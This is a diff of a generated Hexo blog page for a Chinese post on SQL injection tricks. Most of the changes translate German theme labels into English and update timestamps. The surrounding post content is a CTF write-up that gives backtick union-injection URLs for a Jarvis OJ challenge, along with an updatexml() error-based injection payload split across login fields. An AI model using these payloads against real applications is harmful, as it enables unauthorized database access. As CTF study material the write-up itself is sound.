@@ -96,9 +96,9 @@
       labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
     },
     translation: {
-      copy_button: 'Kopieren',
-      copy_success: 'Kopiert',
-      copy_failure: 'Kopieren fehlgeschlagen'
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
     }
   };
 </script>
@@ -121,7 +121,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/04/02/sql注入奇巧淫技/8.png">
 <meta property="og:image" content="http://yoursite.com/2019/04/02/sql注入奇巧淫技/9.png">
 <meta property="og:image" content="http://yoursite.com/2019/04/02/sql注入奇巧淫技/10.png">
-<meta property="og:updated_time" content="2019-07-24T02:35:27.669Z">
+<meta property="og:updated_time" content="2019-07-24T08:22:03.686Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql注入奇巧淫技(一)">
 <meta name="twitter:description" content="持续更新中 group by … with rollup介绍group by … with rollup的用法GROUP BY 语句根据一个或多个列对结果集进行分组。12345678910111213mysql&amp;gt; set names utf8;mysql&amp;gt; SELECT * FROM employee_tbl;+----+--------+---------------------+-">
@@ -212,7 +212,7 @@
   </div>
 
   <div class="site-nav-toggle">
-    <button aria-label="Navigationsleiste an/ausschalten">
+    <button aria-label="Toggle navigation bar">
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
@@ -239,7 +239,7 @@
 
     
 
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
 
   </li>
         
@@ -255,7 +255,7 @@
 
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
 
   </li>
 
@@ -339,14 +339,14 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Posted on</span>
               
 
               
                 
               
 
-              <time title="Erstellt: 2019-04-02 13:59:57" itemprop="dateCreated datePublished" datetime="2019-04-02T13:59:57+08:00">2019-04-02</time>
+              <time title="Created: 2019-04-02 13:59:57" itemprop="dateCreated datePublished" datetime="2019-04-02T13:59:57+08:00">2019-04-02</time>
             </span>
           
 
@@ -359,9 +359,9 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 
-                  <span class="post-meta-item-text">Bearbeitet am</span>
+                  <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Geändert am: 2019-07-24 10:35:27" itemprop="dateModified" datetime="2019-07-24T10:35:27+08:00">2019-07-24</time>
+                <time title="Modified: 2019-07-24 16:22:03" itemprop="dateModified" datetime="2019-07-24T16:22:03+08:00">2019-07-24</time>
               </span>
             
           
@@ -449,8 +449,14 @@
 <p>这道题考查反引号注入，使用反引号的原因是因为有的时候我们在建立数据库的时候，使用的字段与mysql的保留字相同，为了区分开来我们使用反引号，而不使用单引号，比如<strong>create table desc</strong>,这时候会报错，原因是desc是mysql的保留字之一，所以这时候就要使用<strong>create table <code>desc</code></strong>,这样就可以成功创建以desc为名的数据表。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create table desc  <span class="comment"># 报错</span></span><br><span class="line">create table `desc`  <span class="comment"># 能成功执行</span></span><br><span class="line"></span><br><span class="line">desc `abc` `def`</span><br><span class="line">desc abc def </span><br><span class="line"><span class="comment"># 效果是一样的</span></span><br></pre></td></tr></table></figure></p>
 <p>附上这道题的payload:<br>这里有个点，就是空格被过滤了，所以我们可以用%20代替<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">爆库名：</span><br><span class="line">http://web.jarvisoj.com:32794/?table=test`%20%20`union%20select%20%20limit%201,1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆表名：</span><br><span class="line">http://web.jarvisoj.com:32794/?table=test`%20%20`union%20select%20%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1</span><br><span class="line"></span><br><span class="line">secret_flag,secret_test </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆字段名：</span><br><span class="line">http://web.jarvisoj.com:32794/?table=test`%20%20`union%20select%20%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20limit%201,1</span><br><span class="line"><span class="comment">#实际上在这里，我们没有使用where table_name = "xxx",因为注入时，发现""和''被过滤掉了</span></span><br><span class="line">flagUwillNeverKnow,username </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">爆flag:</span><br><span class="line">http://web.jarvisoj.com:32794/?table=test`%20%20`union%20select%20%20group_concat(flagUwillNeverKnow)%20from%20secret_flag%20limit%201,1</span><br><span class="line"></span><br><span class="line">flag&#123;luckyGame~&#125;</span><br></pre></td></tr></table></figure></p>
 <h1 id="加了料的报错注入-实验吧"><a href="#加了料的报错注入-实验吧" class="headerlink" title="加了料的报错注入(实验吧)"></a>加了料的报错注入(实验吧)</h1><p>看题目就知道这里考察的是报错注入<br>然后通过fuzz，发现这里几乎所有的关键词都被过滤了，但是updatexml()，还有extractvalue()这样的报错函数没有被过滤掉，查看提示<br>查询语句为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"select * from users where username='$username' and password='$password'"</span>;</span><br></pre></td></tr></table></figure></p>
-<p>构造payload使得整个语句可有报错的效果<br>select <em> from users where<br>username=’1’ and updatexml/</em>‘ and password=*’/(1,concat(0x7e,select(database()),0x7e),1)<br>and ‘1   </p>
-<p>那也就是说构造出来的username和passwor要是这样的<br>username = 1’ and updatexml/<em><br>password = </em>‘/(1,concat(0x7e,select(database()),0x7e),1) and ‘1</p>
+<p>构造payload使得整个语句可有报错的效果</p>
+<hr>
+<p>select <em> from users where<br>`username=’1’ and updatexml/</em>‘<code></code>and password=*’/(1,concat(0x7e,select(database()),0x7e),1) and ‘1`   </p>
+<hr>
+<p>那也就是说构造出来的username和passwor要是这样的</p>
+<hr>
+<p><code>username = 1&#39; and updatexml/*</code><br><code>password = *&#39;/(1,concat(0x7e,select(database()),0x7e),1) and &#39;1</code></p>
+<hr>
 
       
     </div>
@@ -543,10 +549,10 @@
       
         <ul class="sidebar-nav motion-element">
           <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Inhaltsverzeichnis
+            Table of Contents
           </li>
           <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Übersicht
+            Overview
           </li>
         </ul>
       
@@ -570,7 +576,7 @@
           <a href="/archives/">
         
           <span class="site-state-item-count">71</span>
-          <span class="site-state-item-name">Artikel</span>
+          <span class="site-state-item-name">posts</span>
         </a>
       </div>
     
@@ -641,7 +647,7 @@
 </div>
 
 
-  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
 
 
 
@@ -649,7 +655,7 @@
 
 
 
-  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.2.0</div>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.2.0</div>
 
 
 
